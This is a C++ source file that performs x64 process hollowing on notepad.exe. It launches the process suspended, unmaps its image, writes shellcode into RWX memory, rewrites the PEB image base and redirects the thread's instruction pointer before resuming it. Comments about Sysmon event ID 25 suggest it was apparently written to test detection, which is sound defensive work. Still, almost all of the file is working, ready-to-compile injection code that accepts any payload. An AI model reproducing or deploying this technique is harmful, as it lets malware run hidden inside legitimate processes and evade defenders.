#include "common.h"
#include <winternl.h>

typedef NTSTATUS(WINAPI* NtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
    HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

int main() {
    wprintf(L"[*] Starting process hollowing x64...\n");

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};

    if (!CreateProcessW(
        L"C:\\Windows\\System32\\notepad.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED,
        NULL, NULL, &si, &pi)) {
        wprintf(L"[-] CreateProcess failed: %lu\n", GetLastError());
        return 1;
    }
    wprintf(L"[+] Suspended PID: %lu TID: %lu\n",
            pi.dwProcessId, pi.dwThreadId);

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");

    auto NtQIP = (pNtQueryInformationProcess)GetProcAddress(
        ntdll, "NtQueryInformationProcess");

    PROCESS_BASIC_INFORMATION pbi = {};
    ULONG retLen = 0;
    NtQIP(pi.hProcess, ProcessBasicInformation,
          &pbi, sizeof(pbi), &retLen);
    wprintf(L"[+] PEB at: 0x%p\n", pbi.PebBaseAddress);

    // x64 PEB offset 0x10 = ImageBaseAddress
    PVOID imageBase = NULL;
    SIZE_T bytesRead = 0;
    ReadProcessMemory(pi.hProcess,
        (PBYTE)pbi.PebBaseAddress + 0x10,
        &imageBase, sizeof(PVOID), &bytesRead);
    wprintf(L"[+] Remote image base: 0x%p\n", imageBase);

    // Unmap original image — EID 25 fires here
    auto myNtUnmap = (NtUnmapViewOfSection)GetProcAddress(
        ntdll, "NtUnmapViewOfSection");
    NTSTATUS st = myNtUnmap(pi.hProcess, imageBase);
    wprintf(L"[+] NtUnmapViewOfSection: 0x%08X\n", st);

    // Allocate at original base
    LPVOID newMem = VirtualAllocEx(
        pi.hProcess, imageBase,
        shellcode_size + 0x2000,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!newMem) {
        wprintf(L"[!] Original base failed, using NULL\n");
        newMem = VirtualAllocEx(
            pi.hProcess, NULL,
            shellcode_size + 0x2000,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
    }
    wprintf(L"[+] Allocated at: 0x%p\n", newMem);

    // Shellcode at +0x1000 for alignment
    LPVOID shellcodeAddr = (PVOID)((ULONG_PTR)newMem + 0x1000);

    SIZE_T written = 0;
    WriteProcessMemory(pi.hProcess, shellcodeAddr,
                       shellcode, shellcode_size, &written);
    wprintf(L"[+] Shellcode written: %zu bytes at 0x%p\n",
            written, shellcodeAddr);

    // Update PEB ImageBaseAddress
    WriteProcessMemory(pi.hProcess,
        (PBYTE)pbi.PebBaseAddress + 0x10,
        &newMem, sizeof(PVOID), NULL);
    wprintf(L"[+] PEB ImageBase updated\n");

    // Verify bytes
    unsigned char verify[8] = {};
    ReadProcessMemory(pi.hProcess, shellcodeAddr, verify, 8, NULL);
    wprintf(L"[+] First bytes at Rip: ");
    for (int i = 0; i < 8; i++) wprintf(L"%02X ", verify[i]);
    wprintf(L"\n");

    // Get full thread context
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    wprintf(L"[+] Original Rip: 0x%llx\n", ctx.Rip);
    wprintf(L"[+] Original Rsp: 0x%llx\n", ctx.Rsp);

    // x64 — Rip is instruction pointer
    ctx.Rip = (DWORD64)shellcodeAddr;

    // Align stack + shadow space
    ctx.Rsp = (ctx.Rsp & ~0xF) - 0x28;

    SetThreadContext(pi.hThread, &ctx);
    wprintf(L"[+] Rip set to: 0x%p\n", shellcodeAddr);

    ResumeThread(pi.hThread);
    wprintf(L"[*] Resumed — watch for EID 25\n");

    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
